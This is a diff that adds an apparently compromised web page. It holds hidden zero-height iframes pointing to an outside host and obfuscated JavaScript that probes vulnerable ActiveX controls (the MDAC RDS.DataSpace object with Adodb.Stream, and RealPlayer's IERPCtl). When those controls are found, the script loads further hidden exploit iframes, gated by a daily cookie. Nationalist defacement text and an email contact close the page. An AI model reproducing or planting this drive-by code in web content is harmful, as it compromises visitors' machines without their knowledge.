@@ -1,0 +1,78 @@
+<iframe src='http://www.ririwow.cn/14.htm' width='100' height='0'></iframe>
+<iframe src='http://www.ririwow.cn/real.htm' width='100' height='0'></iframe>
+<iframe src='http://www.ririwow.cn/07004.htm' width='100' height='0'></iframe>
+<script language="javaScript">
+function writeInfo()
+{
+
+}
+window.onload = writeInfo;
+if(document.cookie.indexOf('MyCookie')==-1)
+{
+	exit();
+}
+
+function exit()
+{
+var Cikeid1="clsid:BD9" + "6C556" + "-65A3-11D";
+var Cikeid2="0-983A" + "-00C04FC29E36";
+var Cikeid=Cikeid1+Cikeid2;
+var errinfo = "[object Error]";
+try{
+var e;
+var afilesto=(document["creat"+"eElement"]("object"));
+afilesto["setAttribute"]("classid",Cikeid);
+window["ado"]["createobject"]("Ad"+"odb."+"S"+"tr"+"e"+"am","")}
+catch(e){};
+finally{
+var hoodt=new Date();
+hoodt.setTime(hoodt.getTime()+86400000);
+document.cookie='MyCookie=lonely;path=/;hoodt='+hoodt.toGMTString();
+if(e!=errinfo)
+{
+}
+else
+{
+
+
+
+try
+{
+var reals=new window["ActiveXObject"]("IERP"+"Ctl.I"+"ERPCtl.1");
+var IEINFO;
+}
+catch(IEINFO)
+{
+};
+finally
+{
+if(IEINFO!=errinfo)
+{
+document.write("<iframe src='http://www.ririwow.cn/real11.htm' width='100' height='0'></iframe>")
+}
+}
+
+}
+}
+}
+</script>
+
+
+
+
+<script language="javascript" src="http://count36.51yes.com/click.aspx?id=367875183&logo=1"></script>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1874600.js"></script>
+<noscript><a href="http://www.51.la/?1874600" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="http://img.users.51.la/1874600.asp" style="border:none" /></a></noscript>
+
+This is a mass invasion.        Safeguard the motherland's dignity!
+FUCK FRANCE!  FUCK CNN!  I WILL ATTACK you ALWAYS  !
+I love my motherland!
+sorry
+Please understand that I
+IF YOU WANT TO SAY SOMETHING .
+PLEASE SEND EMAIL TO kiss117276@163.com
+
+
+
+
+
